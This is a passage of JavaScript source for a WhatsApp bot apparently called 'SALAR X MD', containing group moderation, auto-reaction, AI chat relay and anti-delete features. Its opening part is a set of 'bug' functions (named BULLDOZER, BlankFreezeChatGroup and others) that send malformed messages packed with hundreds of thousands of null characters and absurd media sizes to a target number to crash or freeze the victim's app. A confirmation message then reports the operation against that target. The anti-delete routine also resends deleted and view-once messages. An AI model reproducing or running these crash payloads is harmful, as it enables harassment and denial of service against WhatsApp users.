    imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 999999999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "Crash Raju",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
};

const msg = generateWAMessageFromContent(target, Squid, {});

await devtrust.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

    await devtrust.relayMessage(
      target,
      {
    statusMentionMessage: {
        message: {
           protocolMessage: {
              key: msg.key,
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "false" },
                content: undefined,
              },
            ],
          },
        },
      },
      {}
    );
console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
await sleep(3000);
  }

//BULLDOZER
async function rajudelxbulldo1(devtrust, target) {    
    const Fungsi = {
        viewOnceMessage: {
            message: {
        listMessage: {
    title: "\u0000".repeat(9999),
    description: "\u0000".repeat(75000),
    buttonText: "RAJU X HERE",
    footerText: "RAJU X HERE",
    listType: 3,

    sections: [
      {
        title: "",
        rows: Array.from({ length: 1999 }, (_, i) => ({
          title: `\u0000`.repeat(9999),
          description: `\u0000`.repeat(75000),
          rowId: null
        }))
      }
    ],
            contextInfo: {
                remoteJid: Math.random().toString(40) + "REQUEST_LOCATION",
                mentionedJid: [ target ]
                }
  }
}
            }
        }
         
        await devtrust.relayMessage(target, Fungsi, {
            participant: { jid: target }
            });
console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
}

async function BlankFreezeChatGroup(devtrust, target) {
  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"amba","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  };
  
  const prepared = await generateWAMessageFromContent(target, msg, {});
  await devtrust.relayMessage(target, prepared.message, {
    messageId: prepared.key.id
  });
}

async function rajudelayy(devtrust, target) {
  await devtrust.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: "hello dear",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1500000)}"}}`,
            version: 3
          }
        }
      }
    }, { participant: { Jid: target }});
console.log(chalk.blue("𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗨𝗚 𝗥𝗨𝗡!"));
  }


        // ================= ( Bates Function )=====================
        async function doneress() {
            if (!text) throw "❌ Target information required";

            let pepec = args[0].replace(/[^0-9]/g, "");
            let thumbnailUrl = "https://i.ibb.co/rGr4bWW8/image1.jpg";

            let ressdone = `
*𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 — Operation Complete*

▸ Type: ${command}
▸ Target: ${pepec}

System requires a 10-minute cooldown before next operation.
`;

            await devtrust.sendMessage(m.chat, {
                image: { url: thumbnailUrl },
                caption: ressdone,
                gifPlayback: true,
                gifAttribution: 1,
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: false,
                        title: "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 — Bug System",
                        body: "Operation Complete",
                        thumbnailUrl: thumbnailUrl,
                        sourceUrl: "https://whatsapp.com/channel/0029VbDt7SpKwqSUtcpRIz3r",
                        mediaType: 1,
                        renderLargerThumbnail: false
                    },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363427254972269@newsletter",
                        newsletterName: "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗",
                        serverMessageId: -1
                    }
                },
                headerType: 6,
                viewOnce: false
            }, { quoted: m });
        }

        // ============ ACCOUNT FUNCTIONS ============
        const ACCOUNT_FILE = './database/accounts.json';

        function loadAccounts() {
            if (!fs.existsSync(ACCOUNT_FILE)) {
                fs.writeFileSync(ACCOUNT_FILE, JSON.stringify({}));
            }
            return JSON.parse(fs.readFileSync(ACCOUNT_FILE));
        }

        function saveAccounts(data) {
            fs.writeFileSync(ACCOUNT_FILE, JSON.stringify(data, null, 2));
        }
        // Ensure directories exist
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        if (!fs.existsSync(PAIRING_DIR)) fs.mkdirSync(PAIRING_DIR, { recursive: true });

        // ============ GLOBAL VARIABLES ============
        const more = String.fromCharCode(8206);
        const readMore = more.repeat(4001);
        const Richie = "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 🥶";

        global.packname = "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗";
        global.author = "𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗";

// ==================== RAJU PASSTHROUGH CHAT PROCESSOR ====================
const rajuUid = m.sender;
const rajuSession = rajuGetSession(rajuUid);
if (
    rajuSession &&
    rajuSession.active &&
    rajuSession.chatId === m.chat &&
    !isCmd &&
    !m.key.fromMe &&
    m.key.remoteJid !== 'status@broadcast'
) {
    let userInputText = body || m.text || '';
    if (/image|video|audio|document/.test(m.mtype)) {
        userInputText = `[User sent ${m.mtype}] ${userInputText ? 'Caption: ' + userInputText : ''}`;
    }
if (userInputText && userInputText.trim().length > 0) {
    // Jangan await presence — tidak blocking, AI call langsung jalan paralel
    devtrust.sendPresenceUpdate('composing', m.chat).catch(() => {});

    setImmediate(async () => {
        try {
            // rajuLearn (spawn python) dibuat fire-and-forget murni,
            // tidak menunda rajuCallAI sama sekali
            setImmediate(() => {
                rajuLearn(rajuUid, m.pushName || 'WhatsApp User', userInputText).catch(() => {});
            });

            const resultAI = await rajuCallAI(userInputText, rajuSession.model, rajuSession.convId, rajuSession.webSearch, rajuSession.systemPrompt);
            if (!resultAI.text && (!resultAI.media || resultAI.media.length === 0)) {
                await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `⚠️ AI returned empty response. Try *.raju-action-model*` }), { quoted: m });
            } else {
                if (resultAI.media?.length > 0) {
                    for (const asset of resultAI.media) {
                        try {
                            if (asset.type === 'photo') await devtrust.sendMessage(m.chat, { image: { url: asset.url } }, { quoted: m });
                            else if (asset.type === 'video') await devtrust.sendMessage(m.chat, { video: { url: asset.url } }, { quoted: m });
                            else if (asset.type === 'audio') await devtrust.sendMessage(m.chat, { audio: { url: asset.url }, mimetype: 'audio/mp4' }, { quoted: m });
                            else if (asset.type === 'document') await devtrust.sendMessage(m.chat, { document: { url: asset.url }, fileName: 'File' }, { quoted: m });
                        } catch (e) {}
                    }
                }
                if (resultAI.text) {
                    for (const chunk of rajuSplitMessage(resultAI.text)) {
                        await devtrust.sendMessage(m.chat, addNewsletterContext({ text: chunk }), { quoted: m });
                    }
                }
            }
        } catch (err) {
            await devtrust.sendMessage(m.chat, addNewsletterContext({ text: `❌ AI Error: ${err.message || 'Unknown error'}` }), { quoted: m });
        } finally {
            await devtrust.sendPresenceUpdate('paused', m.chat);
        }
    });
    
    return;
}
}
// =========================================================================

if (!devtrust.public) {
    const publicCmds = ['menu', 'allmenu', 'bugmenu'];
    if (!isCreator && isCmd && !publicCmds.includes(command)) return
}
        const example = (teks) => {
            return `Usage : *${prefix + command}* ${teks}`
        }

        let antilinkStatus = {};
        if (!global.banned) global.banned = {}
const BIO_COOLDOWN = 5 * 60 * 1000;
if (getSetting(m.sender, "autobio", true)) {
    const now = Date.now();
    if (!global._lastBioUpdate || now - global._lastBioUpdate > BIO_COOLDOWN) {
        global._lastBioUpdate = now;
        devtrust.updateProfileStatus(`𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗...`).catch(_ => _);
    }
}

        if (isCmd) {
            console.log(chalk.black(chalk.bgWhite('[ 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=>In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
        if (getSetting(m.chat, "autoTyping", false)) {
            devtrust.sendPresenceUpdate('composing', from)
        }
        if (getSetting(m.chat, "autoRecording", false)) {
            devtrust.sendPresenceUpdate('recording', from)
        }
        if (getSetting(m.chat, "autoReact", false)) {
            const emojis = [
                "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
                "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
                "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
                "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
                "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
                "🤪", "🀄", "😠", "🀄", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
                "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
                "👿", "👹", "👺", "💀", "👻", "🖕", "🙏", "🤖", "🎃", "😺",
                "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
                "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
            ];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            try {
                await devtrust.sendMessage(m.chat, {
                    react: { text: randomEmoji, key: m.key },
                });
            } catch (err) {
                console.error('Error while reacting:', err.message);
            }
        }

        if (getSetting(m.chat, "autoRecordType", false)) {
            let xeonrecordin = ['recording', 'composing']
            let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
            devtrust.sendPresenceUpdate(xeonrecordinfinal, from)
        }

        //----------------------Func End----------------//
        if (getSetting(m.sender, "autoViewStatus", false) && m.key.remoteJid === "status@broadcast") {
            try {
                await devtrust.readMessages([m.key]);
                console.log(`👀 Viewed status from: ${m.key.participant}`);
            } catch (err) {
                console.log("❌ Error viewing status:", err);
            }
        }

        if (getSetting(m.chat, "autoRecording", false)) {
            devtrust.sendPresenceUpdate('recording', from)
        }

        if (getSetting(m.chat, "autoTyping", false)) {
            devtrust.sendPresenceUpdate('composing', from)
        }

        if (getSetting(m.chat, "autoRecordType", false)) {
            let xeonrecordin = ['recording', 'composing']
            let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
            devtrust.sendPresenceUpdate(xeonrecordinfinal, from)
        }

        if (getSetting(m.sender, "autoread", false)) {
            try {
                await devtrust.readMessages([m.key])
            } catch (e) {
                console.log("Auto-Read Error:", e)
            }
        }

        // ======================[ BANNED USERS CHECK ]======================
        if (getSetting(m.sender, "banned", false)) {
            await reply(`⛔ You are banned from using this bot, @${m?.sender?.split('@')?.[0] || 'User'}`, [m.sender])
            return
        }

        // ======================[ 🔇 MUTED USERS CHECK ]======================
        if (m.isGroup && global.muted?.[m.chat]?.includes(m.sender) && !isAdmins && !isCreator) {
            await devtrust.sendMessage(m.chat, { delete: m.key });
            return;
        }

        // ======================[ 🛡️ ANTI FEATURES DETECTION - FIXED ]======================

        // ANTILINK CHECK
        if (m.isGroup && body && !isAdmins && !isCreator) {
            // Check if this group has anti-link enabled
            const groupSettings = antilinkSettings[m.chat];
            if (groupSettings && groupSettings.enabled) {
                const linkRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|([a-zA-Z0-9]+\.(com|net|org|io|gov|edu|xyz|tk|ml|ga|cf|gq|me|tv|cc|ws|club|online|site|tech|store|blog|xyz))(\/[^\s]*)?/i;

                if (linkRegex.test(body.toLowerCase())) {
                    // Delete the message first
                    await devtrust.sendMessage(m.chat, { delete: m.key });

                    // Check what action to take
                    if (groupSettings.action === 'kick') {
                        // Try to kick the user
                        try {
                            await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                            await reply(`👢 @${m?.sender?.split('@')?.[0] || 'User'} was kicked for posting links`, [m.sender]);
                        } catch (kickError) {
                            // If kick fails (maybe bot not admin), just warn
                            await reply(`⚠️ @${m?.sender?.split('@')?.[0] || 'User'} links are not allowed. (Kick failed - am I admin?)`, [m.sender]);
                        }
                    } else {
                        // Just delete and warn
                        await reply(`🔗 @${m?.sender?.split('@')?.[0] || 'User'} links are not allowed in this group`, [m.sender]);
                    }
                }
            }
        }

        // ANTI-TAG CHECK
        if (m.isGroup && m.mentionedJid && m.mentionedJid.length > 0 && !isAdmins && !isCreator) {
            const config = getSetting(m.chat, "antitag", { enabled: false, action: 'delete' });
            if (config.enabled && m.mentionedJid.length > 5) {
                // Delete the message
                await devtrust.sendMessage(m.chat, { delete: m.key });

                if (config.action === 'delete') {
                    await reply(`🏷️ @${m?.sender?.split('@')?.[0] || 'User'} mass tagging is not allowed`, [m.sender]);
                }
                else if (config.action === 'kick') {
                    if (!isAdmins && !isCreator) {
                        await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                        await reply(`👢 @${m?.sender?.split('@')?.[0] || 'User'} kicked for mass tagging`, [m.sender]);
                    } else {
                        await reply(`⚠️ @${m?.sender?.split('@')?.[0] || 'User'} would be kicked but I need admin rights`, [m.sender]);
                    }
                }
            }
        }
        
//ANTI-DELETE
async function sendAntiDeleteNotification(jid, originalMsg) {
    try {
        const sender   = originalMsg.key?.participant || originalMsg.key?.remoteJid;
        const senderNum = sender?.split('@')[0] || 'unknown';
        const msgContent = originalMsg.message || {};

        const WRAPPER_TYPES = [
            'ephemeralMessage',
            'viewOnceMessage',
            'viewOnceMessageV2',
            'viewOnceMessageV2Extension',
            'documentWithCaptionMessage',
            'editedMessage',
            'botInvokeMessage',
            'futureProofMessage',
            'messageContextInfo', // kadang wraps pesan lain
        ];

        function unwrapMessage(content) {
            if (!content || typeof content !== 'object') return content;
            const topKey = Object.keys(content)[0];
            if (!topKey) return content;
            if (WRAPPER_TYPES.includes(topKey)) {
                const inner = content[topKey]?.message || content[topKey];
                if (inner && typeof inner === 'object' && Object.keys(inner).length > 0) {
                    return unwrapMessage(inner); // rekursif
                }
            }
            return content;
        }

        const resolvedContent = unwrapMessage(msgContent);
        const resolvedType    = Object.keys(resolvedContent)[0] || 'unknown';
        const originalType    = Object.keys(msgContent)[0] || 'unknown';

        // ── Deteksi apakah pesan viewOnce / ephemeral ──────────────
        const wasViewOnce   = originalType.startsWith('viewOnce');
        const wasEphemeral  = originalType === 'ephemeralMessage';

        // ── Message body text for header ───────────────────────────
        const previewText = (() => {
            const c = resolvedContent[resolvedType] || {};
            return (
                c?.caption ||
                c?.text ||
                resolvedContent?.conversation ||
                resolvedContent?.extendedTextMessage?.text ||
                ''
            ).slice(0, 200);
        })();

        // ── Check if text is too long ───────────────────────────────
        const fullText =
            resolvedContent?.conversation ||
            resolvedContent?.extendedTextMessage?.text || '';
        if (fullText.length > 60000) {
            await devtrust.sendMessage(jid, {
                text: `╭─❍「 🗑️ *ANTI-DELETE* 」\n│ 👤 *By* : @${senderNum}\n│ ⚠️ Message too long (>60k characters), cannot be resent.\n╰───────────────`,
                mentions: [sender]
            });
            return;
        }

        // ── Kirim header notifikasi ────────────────────────────────
        const flagNote = wasViewOnce ? ' *(ViewOnce Unlocked 🔓)*' : wasEphemeral ? ' *(Ephemeral)*' : '';
        const header =
            `╭─❍「 🗑️ *ANTI-DELETE DETECTED* 」\n` +
            `│ 👤 *Deleted By* : @${senderNum}\n` +
            `│ 📌 *Type* : \`${resolvedType}\`${flagNote}\n` +
            (previewText ? `│ 💬 *Preview* : ${previewText}\n` : '') +
            `│ 🕒 *Time* : ${moment().tz('Asia/Jakarta').format('HH:mm:ss')}\n` +
            `╰───────────────`;

        await devtrust.sendMessage(jid, { text: header, mentions: [sender] });

        // ── Helper download + decrypt media WhatsApp ──────────────
        // data.url alone CANNOT be used directly with sendMessage (encrypted),
        // harus didekripsi via downloadContentFromMessage dulu jadi Buffer.
        async function downloadMediaBuffer(mediaData, mediaType) {
            const stream = await downloadContentFromMessage(mediaData, mediaType);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk]);
            }
            return buffer;
        }

        // ── Helper download + kirim ulang media ───────────────────
        async function trySendMedia(sendFn) {
            try {
                await sendFn();
            } catch (e) {
                // Kalau url expired / gagal download, beri tahu saja
                await devtrust.sendMessage(jid, {
                    text: `⚠️ Media of type *${resolvedType}* found but could not be resent (URL may have expired).\n_Error: ${e.message}_`
                });
            }
        }

        const data = resolvedContent[resolvedType] || {};

        // ================================================================
        // SEMUA TIPE PESAN — SUPER LENGKAP
        // ================================================================
        switch (resolvedType) {

            // ── TEKS BIASA ─────────────────────────────────────────
            case 'conversation': {
                const text = resolvedContent.conversation || '';
                if (text) await devtrust.sendMessage(jid, { text });
                break;
            }

            // ── TEKS EXTENDED (bold/italic/link preview) ──────────
            case 'extendedTextMessage': {
                const text = data.text || '';
                const mentions = data.contextInfo?.mentionedJid || [];
                if (text) await devtrust.sendMessage(jid, { text, mentions });
                break;
            }

            // ── GAMBAR ─────────────────────────────────────────────
            case 'imageMessage': {
                await trySendMedia(async () => {
                    const buf = await downloadMediaBuffer(data, 'image');
                    await devtrust.sendMessage(jid, {
                        image: buf,
                        caption: data.caption || '',
                        mimetype: data.mimetype || 'image/jpeg',
                        ...(data.contextInfo?.mentionedJid?.length
                            ? { mentions: data.contextInfo.mentionedJid } : {})
                    });
                });
                break;
            }

            // ── VIDEO ──────────────────────────────────────────────
            case 'videoMessage': {
                await trySendMedia(async () => {
                    const buf = await downloadMediaBuffer(data, 'video');
                    await devtrust.sendMessage(jid, {
                        video: buf,
                        caption: data.caption || '',
                        mimetype: data.mimetype || 'video/mp4',
                        gifPlayback: data.gifPlayback || false,
                        seconds: data.seconds || 0,
                        ...(data.contextInfo?.mentionedJid?.length
                            ? { mentions: data.contextInfo.mentionedJid } : {})
                    });
                });
                break;
            }

            // ── AUDIO / PTT (Voice Note) ───────────────────────────
            case 'audioMessage': {
                await trySendMedia(async () => {
                    const buf = await downloadMediaBuffer(data, 'audio');
                    await devtrust.sendMessage(jid, {
                        audio: buf,
                        mimetype: data.mimetype || 'audio/ogg; codecs=opus',
                        ptt: data.ptt || false,
                        seconds: data.seconds || 0
                    });
                });
                break;
            }

            // ── STIKER ─────────────────────────────────────────────
            case 'stickerMessage': {
                await trySendMedia(async () => {
                    const buf = await downloadMediaBuffer(data, 'sticker');
                    await devtrust.sendMessage(jid, {
                        sticker: buf,
                        mimetype: data.mimetype || 'image/webp',
                        isAnimated: data.isAnimated || false,
                        isAvatar: data.isAvatar || false
                    });
                });
                break;
            }

            // ── DOKUMEN / FILE ─────────────────────────────────────
            case 'documentMessage': {
                await trySendMedia(async () => {
                    const buf = await downloadMediaBuffer(data, 'document');
                    await devtrust.sendMessage(jid, {
                        document: buf,
                        mimetype: data.mimetype || 'application/octet-stream',
                        fileName: data.fileName || 'file',
                        caption: data.caption || '',
                        pageCount: data.pageCount || undefined
                    });
                });
                break;
            }

            // ── DOKUMEN + CAPTION (format baru WA) ────────────────
            case 'documentWithCaptionMessage': {
                const inner = data.message?.documentMessage || {};
                await trySendMedia(async () => {
                    const buf = await downloadMediaBuffer(inner, 'document');
                    await devtrust.sendMessage(jid, {
                        document: buf,
                        mimetype: inner.mimetype || 'application/octet-stream',
                        fileName: inner.fileName || 'file',
                        caption: inner.caption || ''
                    });
                });
                break;
            }

            // ── KONTAK TUNGGAL ─────────────────────────────────────
            case 'contactMessage': {
                const vcard = data.vcard || '';
                const displayName = data.displayName || 'Kontak';
                if (vcard) {
                    await devtrust.sendMessage(jid, {
                        contacts: {
                            displayName,
                            contacts: [{ vcard }]
                        }
                    });
                }
                break;
            }

            // ── KONTAK MULTIPLE ────────────────────────────────────
            case 'contactsArrayMessage': {
                const contacts = (data.contacts || []).map(c => ({ vcard: c.vcard }));
                if (contacts.length > 0) {
                    await devtrust.sendMessage(jid, {
                        contacts: {
                            displayName: data.displayName || 'Kontak',
                            contacts
                        }
                    });
                }
                break;
            }

            // ── LOKASI ─────────────────────────────────────────────
            case 'locationMessage': {
                await devtrust.sendMessage(jid, {
                    location: {
                        degreesLatitude: data.degreesLatitude,
                        degreesLongitude: data.degreesLongitude,
                        name: data.name || '',
                        address: data.address || '',
                        url: data.url || ''
                    }
                });
                break;
            }

            // ── LIVE LOCATION ──────────────────────────────────────
            case 'liveLocationMessage': {
                await devtrust.sendMessage(jid, {
                    location: {
                        degreesLatitude: data.degreesLatitude,
                        degreesLongitude: data.degreesLongitude,
                        name: data.caption || 'Live Location',
                        address: ''
                    }
                });
                break;
            }

            // ── POLL ───────────────────────────────────────────────
            case 'pollCreationMessage':
            case 'pollCreationMessageV2':
            case 'pollCreationMessageV3': {
                const pollName  = data.name || 'Poll';
                const pollOpts  = (data.options || []).map(o => o.optionName || '');
                const selectableCount = data.selectableOptionsCount || 1;
                if (pollOpts.length > 0) {
                    await devtrust.sendMessage(jid, {
                        poll: {
                            name: pollName,
                            values: pollOpts,
                            selectableCount
                        }
                    });
                }
                break;
            }

            // ── REACTION ───────────────────────────────────────────
            case 'reactionMessage': {
                const emoji  = data.text || '';
                const reKey  = data.key;
                if (emoji && reKey) {
                    await devtrust.sendMessage(jid, {
                        react: { text: emoji, key: reKey }
                    });
                } else {
                    await devtrust.sendMessage(jid, {
                        text: `🔄 Message is a *Reaction*: ${emoji || '(empty)'}`
                    });
                }
                break;
            }

            // ── GROUP INVITE ───────────────────────────────────────
            case 'groupInviteMessage': {
                const inviteLink = `https://chat.whatsapp.com/${data.inviteCode}`;
                await devtrust.sendMessage(jid, {
                    text: `🔗 *Group Invite Deleted*\n\n📛 *Group Name* : ${data.groupName || '-'}\n🔗 *Link* : ${inviteLink}\n💬 *Caption* : ${data.caption || '-'}`
                });
                break;
            }

            // ── TEMPLATE BUTTON (legacy) ───────────────────────────
            case 'templateMessage': {
                const tmpl = data.hydratedTemplate || data;
                const tmplText =
                    tmpl.hydratedContentText ||
                    tmpl.hydratedTitleText ||
                    'Template Message';
                await devtrust.sendMessage(jid, { text: `📋 *Template Message*:\n${tmplText}` });
                break;
            }

            // ── BUTTONS RESPONSE ───────────────────────────────────
            case 'buttonsResponseMessage': {
                const selected = data.selectedButtonId || data.selectedDisplayText || '-';
                await devtrust.sendMessage(jid, {
                    text: `🔘 *Buttons Response deleted*\n└ Selected: *${selected}*`
                });
                break;
            }

            // ── LIST RESPONSE ──────────────────────────────────────
            case 'listResponseMessage': {
                const selected = data.singleSelectReply?.selectedRowId || '-';
                const title    = data.title || '-';
                await devtrust.sendMessage(jid, {
                    text: `📋 *List Response deleted*\n└ Selected: *${selected}*\n└ Title: *${title}*`
                });
                break;
            }

            // ── INTERACTIVE RESPONSE (Flow / Native Flow) ─────────
            case 'interactiveResponseMessage': {
                let body = '';
                try {
                    const params = JSON.parse(data.nativeFlowResponseMessage?.paramsJson || '{}');
                    body = params.id || params.title || JSON.stringify(params).slice(0, 100);
                } catch { body = '-'; }
                await devtrust.sendMessage(jid, {
                    text: `📱 *Interactive Response deleted*\n└ Data: *${body}*`
                });
                break;
            }

            // ── PROTOCOL MESSAGE (system message, rarely deleted manually) ─
            case 'protocolMessage': {
                await devtrust.sendMessage(jid, {
                    text: `⚙️ *Protocol Message deleted*\n└ Type: *${data.type}*`
                });
                break;
            }

            // ── CALL LOG ────────────────────────────────────────────
            case 'callLogMessage': {
                const callType = data.isVideo ? '📹 Video Call' : '📞 Voice Call';
                const outcome  = data.callOutcome === '1' ? 'Missed' : 'Ended';
                const duration = data.durationSecs ? `${data.durationSecs}s` : '-';
                await devtrust.sendMessage(jid, {
                    text: `📞 *Call Log deleted*\n└ Type: *${callType}*\n└ Status: *${outcome}*\n└ Duration: *${duration}*`
                });
                break;
            }

            // ── HIGH QUALITY LINK PREVIEW ──────────────────────────
            case 'extendedTextMessageWithSneakPeekMedia': {
                const text = data.text || '';
                if (text) await devtrust.sendMessage(jid, { text });
                break;
            }

            // ── NEWSLETTER / CHANNEL MESSAGE ───────────────────────
            case 'newsletterAdminInviteMessage': {
                await devtrust.sendMessage(jid, {
                    text: `📢 *Newsletter Invite deleted*\n└ Name: *${data.newsletterName || '-'}*`
                });
                break;
            }

            // ── STATUS / STORIES ────────────────────────────────────
            case 'statusMentionMessage': {
                await devtrust.sendMessage(jid, {
                    text: `📊 *Status Mention deleted*`
                });
                break;
            }

            // ── SCHEDULED CALL ─────────────────────────────────────
            case 'scheduledCallCreationMessage':
            case 'scheduledCallEditMessage': {
                await devtrust.sendMessage(jid, {
                    text: `📅 *Scheduled Call Message deleted*\n└ Type: *${resolvedType}*`
                });
                break;
            }

            // ── PINNED MESSAGE ─────────────────────────────────────
            case 'pinInChatMessage': {
                await devtrust.sendMessage(jid, {
                    text: `📌 *Pin Message deleted*\n└ Type: *${data.type}*`
                });
                break;
            }

            // ── ALBUM / GALLERY (multi-image) ───────────────────────
            case 'albumMessage': {
                await devtrust.sendMessage(jid, {
                    text: `🖼️ *Album/Gallery deleted*\n└ Media count: *${data.expectedImageCount || '-'}*`
                });
                break;
            }

            // ── FALLBACK — unrecognized type ───────────────────────
            default: {
                // Try forwarding directly as a last resort
                try {
                    await devtrust.sendMessage(jid, {
                        forward: originalMsg,
                        force: true
                    });
                } catch {
                    await devtrust.sendMessage(jid, {
                        text: `⚠️ Message of type *${resolvedType}* cannot be automatically restored.\n_(Unrecognized type)_`
                    });
                }
                break;
            }
        }

    } catch (err) {
        console.error('❌ [sendAntiDeleteNotification Error]:', err.message);
        // Jangan crash bot, cukup log
    }
}


        // ANTI-SPAM CHECK
        if (m.isGroup && !isAdmins && !isCreator) {
            const config = getSetting(m.chat, "antispam", { enabled: false, action: 'delete' });
            if (config.enabled) {
                const now = Date.now();
                const userId = m.sender;
                const chatId = m.chat;

                if (!global.antispam[chatId]) global.antispam[chatId] = {};
                if (!global.antispam[chatId][userId]) {
                    global.antispam[chatId][userId] = {
                        count: 1,
                        timestamp: now
                    };
                } else {
                    const timeDiff = (now - global.antispam[chatId][userId].timestamp) / 1000;

                    if (timeDiff < 5) {
                        global.antispam[chatId][userId].count++;

                        if (global.antispam[chatId][userId].count > 5) {
                            // Delete the message
                            await devtrust.sendMessage(m.chat, { delete: m.key });

                            if (config.action === 'delete') {
                                await reply(`🚫 @${m?.sender?.split('@')?.[0] || 'User'} slow down! (Anti-Spam)`, [m.sender]);
                            }
                            else if (config.action === 'kick') {
                                if (!isAdmins && !isCreator) {
                                    await devtrust.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
                                    await reply(`👢 @${m?.sender?.split('@')?.[0] || 'User'} kicked for spamming`, [m.sender]);
                                } else {
                                    await reply(`⚠️ @${m?.sender?.split('@')?.[0] || 'User'} would be kicked but I need admin rights`, [m.sender]);
                                }
                            }

                            // Reset
                            global.antispam[chatId][userId].count = 0;
                            global.antispam[chatId][userId].timestamp = now;
                        }
                    } else {
                        global.antispam[chatId][userId].count = 1;
                        global.antispam[chatId][userId].timestamp = now;
                    }
                }
            }
        }

        // ANTI-BOT CHECK - FIXED
        if (m.isGroup && body && !isAdmins && !isCreator) {
            const config = getSetting(m.chat, "antibot", { enabled: false, action: 'delete' });
            if (config.enabled) {
                // Check if message starts with common bot prefixes
                const botPrefixes = ['.', '!', '/', '#', '$', '%', '&', '*'];
                const startsWithPrefix = botPrefixes.some(prefix => body.startsWith(prefix));

                // Check if sender ID looks like a bot
                const isBotJid = m.sender.includes('bot') || m.sender.includes('lid') || m.sender.includes('broadcast');

                // ONLY trigger if BOTH conditions are true
                if (startsWithPrefix && isBotJid) {
                    // Delete the message
                    await devtrust.sendMessage(m.chat, { delete: m.key });

                    if (config.action === 'delete') {
                        await reply(`🤖 Bot message detected and deleted`, []);
                    }
                    else if (config.action === 'kick') {
